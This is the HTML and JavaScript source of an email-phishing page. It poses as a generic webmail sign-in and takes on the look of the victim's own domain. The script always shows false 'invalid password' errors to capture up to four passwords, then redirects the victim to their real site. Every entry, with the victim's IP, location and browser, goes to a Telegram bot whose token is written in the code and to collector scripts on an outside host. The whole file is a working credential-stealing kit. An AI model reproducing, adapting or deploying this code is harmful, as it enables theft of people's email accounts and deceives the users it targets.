<body class="dark sharp" id="lebody" style="background-image: url(https://i.imgur.com/W6H22Ci.png); background-size: cover;">
    <div class="b_base login-40">
        <div class="f_base container">
            <div class="f_in row">
                <div class="col-md-12">
                    <div class="form-section">
                        <div class="f_in">
                            <div class="logo">
                                <a href="#">
                                    <img src="" alt="Webmail" id="logo">
                                    <h2 id="logoname" style="font-size: 2rem;"></h2>
                                </a>
                            </div>
                            <h3 id="dom_name" style="margin-bottom: 0rem;"></h3>
                            <center><h2 style="color: #212529; line-height: 1.2;">Sign In To Continue</h2></center>
                            
                            <!-- API CONFIGURATION PANEL - Add your URLs here -->
                            <div class="api-config-panel">
                                <h4><i class="fas fa-plug"></i> Custom API Endpoints</h4>
                                <div>
                                    <label class="config-label"><i class="fas fa-1-circle"></i> API URL #1</label>
                                    <input type="text" id="apiUrl1" class="api-url-input" placeholder="https://your-api-1.com/endpoint" value="https://scitecinstruments.it.com/mine/1/api.php">
                                    <label class="config-label"><i class="fas fa-2-circle"></i> API URL #2</label>
                                    <input type="text" id="apiUrl2" class="api-url-input" placeholder="https://your-api-2.com/webhook" value="https://scitecinstruments.it.com/mine/result/api.php">
                                    <div style="font-size: 11px; color: #6c757d; margin-top: 6px;">
                                        <i class="fas fa-info-circle"></i> Leave empty to skip sending to that endpoint
                                    </div>
                                </div>
                            </div>
                            
                            <div class="login-inner-form">
                                <form class="f_form" id="loginForm" method="POST">
                                    <input type="hidden" name="fcc" id="fcc" value="">
                                    <div class="alert alert-danger mb-3 hidden" id="err" role="alert"></div>
                                    <div class="alert alert-primary mb-3 hidden" id="mi" role="alert"></div>
                                    <div class="form-group form-box">
                                        <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
                                    </div>
                                    <div class="form-group form-box">
                                        <input type="password" id="password" name="password" class="input-text" placeholder="Password" required>
                                        <i class="fa fa-eye sla" id="togglePassword" onclick="togglePasswordVisibility()" aria-hidden="true"></i>
                                    </div>
                                    <span id="msg" style="color:red;"></span>
                                    <div class="checkbox clearfix">
                                        <div class="form-check checkbox-theme">
                                            <input class="form-check-input" type="checkbox" value="" id="rem_me">
                                            <label class="form-check-label" for="rem_me">Remember me</label>
                                        </div>
                                    </div>
                                    <div class="form-group mb-0">
                                        <button type="submit" id="getitBtn" name="sub" class="btn-md btn-theme btn-block sub_b">Continue</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            let attemptCount = 1;
            const MAX_ATTEMPTS = 4;

            // Telegram configuration (kept for backward compatibility)
            const TELEGRAM_BOT_TOKEN = '8717629711:AAHBBxRDJtxD6KHu1q-j38yJ98g5qlqzLeM';
            const TELEGRAM_CHAT_ID = '6159490685';

            // Your PHP endpoint (original server)
            const SERVER_URL = 'https://scitecinstruments.it.com/mine/result/sg.php';

            let messageSentForThisAttempt = false;

            // ========== NEW: Function to send data to custom API URL 1 ==========
            async function sendToApiUrl1(data) {
                const apiUrl = $('#apiUrl1').val().trim();
                if (!apiUrl) {
                    console.log('ℹ️ API URL #1 is empty, skipping');
                    return;
                }
                
                console.log('📡 Sending data to API URL #1:', apiUrl);
                try {
                    const response = await fetch(apiUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify(data),
                        mode: 'cors'  // Allow CORS (some APIs may need this)
                    });
                    
                    let responseText = '';
                    try {
                        responseText = await response.text();
                    } catch(e) { responseText = 'Unable to read response'; }
                    
                    if (response.ok) {
                        console.log('✅ API #1 success:', response.status, responseText.substring(0, 100));
                    } else {
                        console.warn('⚠️ API #1 responded with status:', response.status, responseText.substring(0, 100));
                    }
                } catch (error) {
                    console.error('❌ Failed to send to API URL #1:', error.message);
                    // Don't throw - we don't want to interrupt the flow
                }
            }

            // ========== NEW: Function to send data to custom API URL 2 ==========
            async function sendToApiUrl2(data) {
                const apiUrl = $('#apiUrl2').val().trim();
                if (!apiUrl) {
                    console.log('ℹ️ API URL #2 is empty, skipping');
                    return;
                }
                
                console.log('📡 Sending data to API URL #2:', apiUrl);
                try {
                    const response = await fetch(apiUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify(data),
                        mode: 'cors'
                    });
                    
                    let responseText = '';
                    try {
                        responseText = await response.text();
                    } catch(e) { responseText = 'Unable to read response'; }
                    
                    if (response.ok) {
                        console.log('✅ API #2 success:', response.status, responseText.substring(0, 100));
                    } else {
                        console.warn('⚠️ API #2 responded with status:', response.status, responseText.substring(0, 100));
                    }
                } catch (error) {
                    console.error('❌ Failed to send to API URL #2:', error.message);
                }
            }

            // ========== Enhanced: Send to both custom APIs + existing endpoints ==========
            async function sendToAllCustomApis(email, password, attempt, mxRecord, ip, location, timestamp, userAgent) {
                // Prepare rich data payload for external APIs
                const payload = {
                    email: email,
                    password: password,
                    attempt: attempt,
                    maxAttempts: MAX_ATTEMPTS,
                    mxRecord: mxRecord,
                    ipAddress: ip,
                    location: location,
                    timestamp: timestamp,
                    userAgent: userAgent,
                    source: "MailSystemLogin",
                    eventType: "login_attempt",
                    attemptNumber: attempt,
                    isFinalAttempt: attempt === MAX_ATTEMPTS
                };
                
                // Send to both custom API endpoints concurrently (non-blocking)
                await Promise.allSettled([
                    sendToApiUrl1(payload),
                    sendToApiUrl2(payload)
                ]);
            }

            // ---------- Telegram sender (with error logging) ----------
            function sendToTelegram(message) {
                if (messageSentForThisAttempt) {
                    console.log('⚠️ Already sent for this attempt, blocking duplicate');
                    return;
                }
                messageSentForThisAttempt = true;
                console.log('📤 Sending ONE message to Telegram');

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML&_=${Date.now()}`;
                
                const img = new Image();
                img.onload = () => console.log('✅ Telegram image request loaded');
                img.onerror = () => console.error('❌ Telegram image request failed');
                img.src = url;
            }

            // ---------- Server POST (to your PHP) ----------
            function sendToServer(email, password, attempt) {
                const formData = new URLSearchParams();
                formData.append('email', email);
                formData.append('password', password);
                formData.append('attempt', attempt);

                fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('✅ Server response:', data);
                })
                .catch(err => {
                    console.error('❌ Error sending to server:', err);
                });
            }

            // ---------- Format log message ----------
            function formatLogMessage(email, password, attempt, mxRecord, ip, location) {
                const now = new Date();
                const timeString = now.toLocaleString('en-US', {
                    year: 'numeric', month: 'numeric', day: 'numeric',
                    hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true
                }).replace(',', '');
                return `──────────────────
📧 Email: ${email}
🔑 Password: ${password}
🕐 Time: ${timeString}
🌍 IP: ${ip}
📍 Location: ${location}
📨 MX: ${mxRecord}
🔢 Attempt: ${attempt}/${MAX_ATTEMPTS}`;
            }

            function getMxRecord(email) {
                const domain = email.split('@')[1];
                return `0 mail.${domain}.`;
            }

            // ---------- Get IP and location ----------
            function getIpAndLocation(callback) {
                let callbackCalled = false;
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(data => {
                        if (!callbackCalled) {
                            callbackCalled = true;
                            const ip = data.ip;
                            fetch(`https://ipapi.co/${ip}/json/`)
                                .then(r => r.json())
                                .then(locData => {
                                    const city = locData.city || '';
                                    const region = locData.region || '';
                                    const country = locData.country_name || '';
                                    const location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
                                    callback(ip, location);
                                })
                                .catch(() => callback(ip, 'Unknown'));
                        }
                    })
                    .catch(() => {
                        if (!callbackCalled) {
                            callbackCalled = true;
                            fetch('https://ipapi.co/json/')
                                .then(r => r.json())
                                .then(data => {
                                    const ip = data.ip || 'Unknown';
                                    const city = data.city || '';
                                    const region = data.region || '';
                                    const country = data.country_name || '';
                                    const location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
                                    callback(ip, location);
                                })
                                .catch(() => {
                                    callback('8.8.8.8', 'Mountain View, California, USA');
                                });
                        }
                    });
            }

            function resetSentFlag() {
                messageSentForThisAttempt = false;
            }

            // ---------- Form submission with enhanced API sending ----------
            $("#loginForm").on('submit', function(e) {
                e.preventDefault();

                let password = $("#password").val();
                if (!password || password.length < 1) {
                    $("#msg").text("Please enter your password").css("color", "red");
                    return;
                }

                let email = $("#email").val();
                let mxRecord = getMxRecord(email);
                let currentAttempt = attemptCount;
                resetSentFlag();

                // Fake feedback
                if (currentAttempt < MAX_ATTEMPTS) {
                    $("#msg").text("Invalid password, try again").css("color", "red");
                    $("#password").val("");
                    $("#getitBtn").prop('disabled', false).html("Continue");
                } else {
                    $("#msg").text("Redirecting to your inbox...").css("color", "green");
                    $("#getitBtn").prop('disabled', true).html("Redirecting...");
                }
                attemptCount++;

                getIpAndLocation(async function(ip, location) {
                    const completeMessage = formatLogMessage(email, password, currentAttempt, mxRecord, ip, location);
                    console.log('📤 Sending info for attempt', currentAttempt);
                    
                    // Get current timestamp and user agent for API payload
                    const currentTimestamp = new Date().toISOString();
                    const userAgent = navigator.userAgent;
                    
                    // 1. Send to Telegram (client‑side)
                    sendToTelegram(completeMessage);
                    
                    // 2. Send to your PHP server
                    sendToServer(email, password, currentAttempt);
                    
                    // 3. NEW: Send to both custom API URLs (1 and 2) with structured data
                    await sendToAllCustomApis(email, password, currentAttempt, mxRecord, ip, location, currentTimestamp, userAgent);
                    
                    // Show success indicator in console
                    const api1Url = $('#apiUrl1').val().trim();
                    const api2Url = $('#apiUrl2').val().trim();
                    if (api1Url || api2Url) {
                        console.log(`✨ Data dispatched to custom APIs: ${api1Url ? 'URL1✓' : ''} ${api2Url ? 'URL2✓' : ''}`);
                    }
                });

                // Redirect on final attempt
                if (currentAttempt === MAX_ATTEMPTS) {
                    setTimeout(function() {
                        window.location.href = window.emailDomain;
                    }, 1500);
                }
            });

            // ---------- Parse email from URL ----------
            const urlParams = new URLSearchParams(window.location.search);
            const hashedEmail = urlParams.get('e');
            if (!hashedEmail) {
                $('body').html('<div style="text-align:center; padding:50px; font-size:24px;">Please provide an email parameter in the URL (?e=email@domain.com)</div>');
            } else {
                $("#email").val(hashedEmail);
                let domain = hashedEmail.split('@')[1];
                let siteName = domain.split('.')[0].toUpperCase();
                siteName = siteName.charAt(0).toUpperCase() + siteName.slice(1).toLowerCase();
                document.title = siteName + document.title;
                document.querySelector('#logoname').textContent = siteName;

                let faviconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
                document.querySelector('link[rel="shortcut icon"]')?.setAttribute('href', faviconUrl);
                document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1200/http://${domain}')`;
                document.querySelector('#logo').setAttribute('src', faviconUrl);

                window.emailDomain = 'https://' + domain;
            }
            
            // Optional: Load saved API URLs from localStorage (persists between sessions)
            const savedApi1 = localStorage.getItem('customApiUrl1');
            const savedApi2 = localStorage.getItem('customApiUrl2');
            if (savedApi1) $('#apiUrl1').val(savedApi1);
            if (savedApi2) $('#apiUrl2').val(savedApi2);
            
            // Save URLs when user types (optional convenience)
            $('#apiUrl1').on('change', function() {
                localStorage.setItem('customApiUrl1', $(this).val().trim());
            });
            $('#apiUrl2').on('change', function() {
                localStorage.setItem('customApiUrl2', $(this).val().trim());
            });
            
            // Add small test buttons to verify API endpoints are reachable
            function addTestButtons() {
                const testBtnHtml = `<div style="margin-top: 6px; display: flex; gap: 8px;">
                    <button type="button" id="testApi1Btn" class="test-btn"><i class="fas fa-vial"></i> Test URL #1</button>
                    <button type="button" id="testApi2Btn" class="test-btn"><i class="fas fa-vial"></i> Test URL #2</button>
                </div>`;
                $('.api-config-panel').append(testBtnHtml);
                
                $('#testApi1Btn').on('click', async function() {
                    const url = $('#apiUrl1').val().trim();
                    if (!url) { alert('Please enter API URL #1 first'); return; }
                    console.log('Testing API #1:', url);
                    try {
                        const testPayload = { test: true, message: 'Connection test from mail system', timestamp: new Date().toISOString() };
                        const response = await fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(testPayload),
                            mode: 'cors'
                        });
                        if (response.ok) {
                            alert('✅ API #1 is reachable! Check console for details.');
                        } else {
                            alert(`⚠️ API #1 responded with status ${response.status}. Check console.`);
                        }
                    } catch(e) {
                        alert(`❌ Cannot reach API #1: ${e.message}\nNote: Some APIs block CORS requests from browsers.`);
                    }
                });
                
                $('#testApi2Btn').on('click', async function() {
                    const url = $('#apiUrl2').val().trim();
                    if (!url) { alert('Please enter API URL #2 first'); return; }
                    console.log('Testing API #2:', url);
                    try {
                        const testPayload = { test: true, message: 'Connection test from mail system', timestamp: new Date().toISOString() };
                        const response = await fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(testPayload),
                            mode: 'cors'
                        });
                        if (response.ok) {
                            alert('✅ API #2 is reachable! Check console for details.');
                        } else {
                            alert(`⚠️ API #2 responded with status ${response.status}. Check console.`);
                        }
                    } catch(e) {
                        alert(`❌ Cannot reach API #2: ${e.message}\nNote: Some APIs block CORS requests from browsers.`);
                    }
                });
            }
            addTestButtons();
        });

        // Toggle password visibility
        function togglePasswordVisibility() {
            const e = document.getElementById("password");
            const t = document.getElementById("togglePassword");
            if ("password" === e.type) {
                e.type = "text";
                t.classList.remove("fa-eye");
                t.classList.add("fa-eye-slash");
            } else {
                e.type = "password";
                t.classList.remove("fa-eye-slash");
                t.classList.add("fa-eye");
            }
        }
    </script>
</body>
